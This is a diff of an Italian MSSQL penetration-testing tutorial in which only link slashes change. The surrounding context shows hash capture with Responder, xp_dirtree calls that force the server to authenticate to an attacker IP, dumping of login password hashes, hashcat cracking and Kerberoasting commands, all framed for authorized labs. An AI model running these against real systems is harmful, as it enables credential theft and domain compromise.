@@ -35,7 +35,7 @@ Un server MSSQL con la porta 1433 esposta è uno dei target più redditizi in un
 | Cosa serve                                                  | Perché                                  |
 | ----------------------------------------------------------- | --------------------------------------- |
 | Accesso di rete alla porta 1433/1434                        | Senza questo non c'è nulla da enumerare |
-| [Impacket](https://hackita.it/articoli/impacket) installato | Per `mssqlclient.py`                    |
+| [Impacket](https://hackita.it/articoli/impacket/) installato | Per `mssqlclient.py`                    |
 | Ambiente di test autorizzato (HTB, lab, CTF)                | Ogni comando qui è didattico            |
 
 ***
@@ -452,7 +452,7 @@ Il vettore più sottovalutato di MSSQL — e uno dei più potenti, perché quasi
 sudo responder -I tun0 -v
 ```
 
-Se non conosci ancora lo strumento, trovi la guida completa su [Responder](https://hackita.it/articoli/responder).
+Se non conosci ancora lo strumento, trovi la guida completa su [Responder](https://hackita.it/articoli/responder/).
 
 ```sql
 EXEC master.dbo.xp_dirtree '\\10.10.14.123\share';
@@ -469,7 +469,7 @@ EXEC master..xp_fileexist '\\10.10.14.123\share\file';
 
 Cracca con `hashcat -m 5600 hash.txt rockyou.txt`.
 
-> **Attenzione:** se l'username dell'hash termina con `$` (es. `CORP\SQL01$`) è un account macchina — password casuale di 120 caratteri, non craccabile. In quel caso passa a un relay con [ntlmrelayx.py](https://hackita.it/articoli/impacket).
+> **Attenzione:** se l'username dell'hash termina con `$` (es. `CORP\SQL01$`) è un account macchina — password casuale di 120 caratteri, non craccabile. In quel caso passa a un relay con [ntlmrelayx.py](https://hackita.it/articoli/impacket/).
 
 Verifica chi ha i permessi per usarlo (utile anche come utente non-sysadmin):
 
@@ -641,7 +641,7 @@ SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) FROM master.sys.
 SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins;
 ```
 
-Cracca con `hashcat -m 1731 hashes.txt rockyou.txt` (MSSQL 2012+, algoritmo cambiato), `-m 132` per 2005-2008, `-m 131` per 2000. Approfondisci l'uso di [hashcat](https://hackita.it/articoli/hashcat) per scegliere la modalità giusta.
+Cracca con `hashcat -m 1731 hashes.txt rockyou.txt` (MSSQL 2012+, algoritmo cambiato), `-m 132` per 2005-2008, `-m 131` per 2000. Approfondisci l'uso di [hashcat](https://hackita.it/articoli/hashcat/) per scegliere la modalità giusta.
 
 ***
 
@@ -713,13 +713,13 @@ Il tunnel apre un listener locale (es. porta 1337) che puoi usare con `proxychai
 
 ## 13. Active Directory e Kerberoasting da MSSQL {#13}
 
-Se il server è joined al dominio, puoi enumerare [Active Directory](https://hackita.it/articoli/active-directory) direttamente dal DB.
+Se il server è joined al dominio, puoi enumerare [Active Directory](https://hackita.it/articoli/active-directory/) direttamente dal DB.
 
 ```sql
 SELECT DEFAULT_DOMAIN();
 ```
 
-Il service account MSSQL quasi sempre ha un SPN (`MSSQLSvc/hostname:1433`) — è [Kerberoastable](https://hackita.it/articoli/kerberos) per design:
+Il service account MSSQL quasi sempre ha un SPN (`MSSQLSvc/hostname:1433`) — è [Kerberoastable](https://hackita.it/articoli/kerberos/) per design:
 
 ```bash
 GetUserSPNs.py corp.local/user:pass -dc-ip 10.10.10.10 -request | grep MSSQL
@@ -965,9 +965,9 @@ GetUserSPNs.py corp.local/user:pass -request | grep MSSQL
 **Guide correlate su hackita.it:**
 
 * [SQL Injection su MSSQL: guida web](https://hackita.it/articoli/sql-injection-mssql/)
-* [Impacket: Guida Completa](https://hackita.it/articoli/impacket)
-* [Responder: Hash Capture e NTLM Relay](https://hackita.it/articoli/responder)
-* [Kerberoasting e Service Account Attack](https://hackita.it/articoli/kerberos)
-* [Active Directory Enumeration con BloodHound](https://hackita.it/articoli/active-directory)
+* [Impacket: Guida Completa](https://hackita.it/articoli/impacket/)
+* [Responder: Hash Capture e NTLM Relay](https://hackita.it/articoli/responder/)
+* [Kerberoasting e Service Account Attack](https://hackita.it/articoli/kerberos/)
+* [Active Directory Enumeration con BloodHound](https://hackita.it/articoli/active-directory/)
 
 > Uso esclusivo in ambienti autorizzati.
